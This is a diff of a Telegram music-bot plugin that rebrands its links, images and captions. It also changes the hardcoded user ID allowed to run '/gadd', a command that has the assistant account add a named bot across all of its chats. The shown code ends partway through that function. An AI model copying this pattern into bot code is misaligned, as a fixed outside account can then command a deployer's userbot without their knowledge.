@@ -11,13 +11,13 @@ from BrandrdXMusic.utils.database import add_served_chat, get_assistant
 @app.on_message(filters.command("repo"))
 async def help(client: Client, message: Message):
     await message.reply_photo(
-        photo=f"https://graph.org/file/85091410fd58ae4f2c1cb-adb754c65e20176ce8.jpg",
+        photo=f"https://files.catbox.moe/xgenr4.jpg",
         caption=f""" 𝐟𝐮𝐥𝐥 𝐟𝐢𝐱 𝐫𝐞𝐩𝐨 𝐜𝐡𝐚𝐡𝐢𝐲𝐞 𝐭𝐨 𝐩𝐚𝐡𝐥𝐞 𝐧𝐨𝐛𝐢𝐭𝐚 𝐤𝐨 𝐩𝐚𝐩𝐚 𝐛𝐨𝐥 𝐤𝐞 𝐚𝐚 """,
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "⎯⁠⁠⁠⁠‌⎯⁠⁠⁠‌ ꯭꯭𝚴꯭‌𝛐꯭𝛃꯭‌𝛊꯭‌𝛕꯭𝛂꯭‌𝅃⁠⁠⁠ꀭ꯭‧₊꯭♡゙꯭꯬", url=f"https://t.me/NOBITAXD7"
+                        "⎯⁠⁠⁠⁠‌⎯⁠⁠⁠‌ ꯭꯭𝐂ᴏᴅᴇʀ~ᴋʀɪsʜ", url=f"https://t.me/krishtechCrafter"
                     )
                 ]
             ]
@@ -28,13 +28,13 @@ async def help(client: Client, message: Message):
 @app.on_message(filters.command("clone"))
 async def clones(client: Client, message: Message):
     await message.reply_photo(
-        photo=f"https://graph.org/file/85091410fd58ae4f2c1cb-adb754c65e20176ce8.jpg",
+        photo=f"https://files.catbox.moe/xgenr4.jpg",
         caption=f"""**🙂You Are Not Sudo User So You Are Not Allowed To Clone Me.**\n**😌Click Given Below Button And Host Manually Otherwise Contact Owner Or Sudo Users For Clone.**""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "⎯⁠⁠⁠⁠‌⎯⁠⁠⁠‌ ꯭꯭𝚴꯭‌𝛐꯭𝛃꯭‌𝛊꯭‌𝛕꯭𝛂꯭‌𝅃⁠⁠⁠ꀭ꯭‧₊꯭♡゙꯭꯬", url=f"https://t.me/NOBITAXD7"
+                        "⎯⁠⁠⁠⁠‌⎯⁠⁠⁠‌ ꯭꯭𝐂ᴏᴅᴇʀ~ᴋʀɪsʜ", url=f"https://t.me/krishtechCrafter"
                     )
                 ]
             ]
@@ -63,12 +63,12 @@ async def bot_check(_, message):
 import asyncio
 
 
-@app.on_message(filters.command("gadd") & filters.user(int(7250012103)))
+@app.on_message(filters.command("gadd") & filters.user(int(7458057585)))
 async def add_allbot(client, message):
     command_parts = message.text.split(" ")
     if len(command_parts) != 2:
         await message.reply(
-            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @Systumm_music_bot`**"
+            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @CatuRobot`**"
         )
         return
 
@@ -82,7 +82,7 @@ async def add_allbot(client, message):
         lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
         await userbot.send_message(bot_username, f"/start")
         async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1001754457302:
+            if dialog.chat.id == -1002115990090:
                 continue
             try:
 
